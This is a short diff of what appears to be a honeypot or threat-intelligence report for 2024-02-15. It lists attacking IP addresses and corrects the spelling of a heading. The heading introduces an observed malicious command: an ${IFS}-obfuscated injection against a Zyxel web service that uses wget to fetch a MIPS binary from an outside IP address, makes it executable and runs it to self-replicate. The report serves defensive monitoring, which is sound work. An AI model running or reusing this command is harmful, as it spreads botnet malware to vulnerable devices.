@@ -6,7 +6,7 @@ Top 5 IPs for 2024-02-15:
 59.127.234.82
 182.253.33.65
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 /bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*mips*;${IFS}wget${IFS}http://103.180.149.156/huhu.mips;${IFS}chmod${IFS}777${IFS}huhu.mips;${IFS}./huhu.mips${IFS}zyxel.selfrep;
 
